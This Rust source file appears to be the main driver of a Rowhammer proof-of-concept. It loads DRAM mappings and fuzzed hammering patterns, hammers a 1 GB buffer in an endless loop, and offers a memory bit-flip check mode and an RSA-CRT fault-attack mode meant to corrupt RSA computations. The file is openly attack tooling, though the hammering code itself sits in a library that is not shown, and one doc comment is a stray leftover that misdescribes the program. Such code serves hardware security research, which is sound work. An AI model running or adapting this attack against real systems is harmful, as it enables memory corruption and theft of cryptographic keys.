use anyhow::{bail, Context, Result};
use bs_poc::forge::{Hammerer, Hammering, HammeringPattern};
use bs_poc::memory::{MemBlock, Memory, PfnResolver, VictimMemory};
use bs_poc::util::{BlacksmithConfig, MemConfiguration};
use bs_poc::victim::{HammerVictim, HammerVictimMemCheck, HammerVictimRsa};
use clap::Parser;
use std::fmt::Debug;

#[macro_use]
extern crate log;

/// Search for a pattern in a file and display the lines that contain it.
#[derive(Debug, Parser)]
struct CliArgs {
    /// The JSON file containing the memory config
    #[clap(long = "config", default_value = "config.json")]
    config: String,
    /// The JSON file containing hammering patterns to load
    #[clap(long = "load-json", default_value = "fuzz-summary.json")]
    load_json: String,
    /// The pattern ID to load from the JSON file
    #[clap(long = "pattern")]
    pattern: String,
    /// The mapping ID to load from the JSON file (optional)
    #[clap(long = "mapping")]
    mapping: Option<String>,
    /// The hammering mode to use. Set to memcheck for bit flip check or rsa for RSA-CRT attack
    #[clap(long = "hammer-mode")]
    hammer_mode: HammerMode,
    /// The hammering mode to use. Set to memcheck for bit flip check or rsa for RSA-CRT attack
    #[clap(long = "elevated-priority", action)]
    elevated_priority: bool,
    /// use dummy hammerer
    #[clap(long = "dummy-hammerer", action)]
    dummy_hammerer: bool,
}

#[derive(clap::ValueEnum, Clone, Debug)]
enum HammerMode {
    MemCheck,
    Rsa,
}

fn main() -> Result<()> {
    env_logger::init();
    info!("startup");
    let args = CliArgs::parse();
    info!("args: {:?}", args);

    if args.elevated_priority {
        let ret = unsafe { libc::setpriority(libc::PRIO_PROCESS, 0, -20) };
        if ret < 0 {
            bail!("setpriority failed. Are we root?");
        }
    }

    const MEM_SIZE: usize = 1 << 30; // 1 GB

    let memory = Memory::new(MEM_SIZE)?;
    let block = MemBlock::new(memory.addr(0), MEM_SIZE);

    info!("allocated {} B of memory", MEM_SIZE);

    let phys = block.pfn();
    match phys {
        Ok(phys) => info!("phys base_msb: 0x{:02X}", phys),
        Err(err) => warn!("Failed to determine physical address: {}", err),
    }

    let config = BlacksmithConfig::from_jsonfile(&args.config).with_context(|| "from_jsonfile")?;
    let mem_config =
        MemConfiguration::from_bitdefs(config.bank_bits, config.row_bits, config.col_bits);
    let offset = 0x17B31343;
    let blocks = vec![block];
    let hammerer: Box<dyn Hammering> = if args.dummy_hammerer {
        todo!("dummy hammerer not implemented")
        /*Box::new(DummyHammerer::new(
            memory.addr(0).clone() as *mut u8,
            offset,
        ))*/
    } else {
        // load patterns from JSON
        let pattern =
            HammeringPattern::load_pattern_from_json(args.load_json.clone(), args.pattern.clone())?;
        let mapping = match args.mapping {
            Some(mapping) => pattern.find_mapping(&mapping).expect("mapping not found"),
            None => pattern
                .determine_most_effective_mapping()
                .expect("pattern contains no mapping"),
        };
        let addrs =
            mapping.get_hammering_addresses(&pattern.access_ids, memory.addr(0), mem_config);

        Box::new(Hammerer::new(
            mem_config, pattern, mapping, &addrs, &blocks,
        )?)
    };
    let mut victim: Box<dyn HammerVictim> = match args.hammer_mode {
        HammerMode::MemCheck => Box::new(HammerVictimMemCheck::new(mem_config, &memory)),
        HammerMode::Rsa => Box::new(HammerVictimRsa::new(&memory, offset)?),
    };
    info!("initialized hammerer");
    info!("start hammering");
    loop {
        let result = hammerer.hammer(victim.as_mut(), 1);
        match result {
            Ok(result) => {
                println!(
                    "Successful at run {} after {} attempts",
                    result.run, result.attempt,
                );
                victim.log_report();
            }
            Err(e) => println!("Hammering not successful: {:?} Retrying...", e),
        }
    }
}
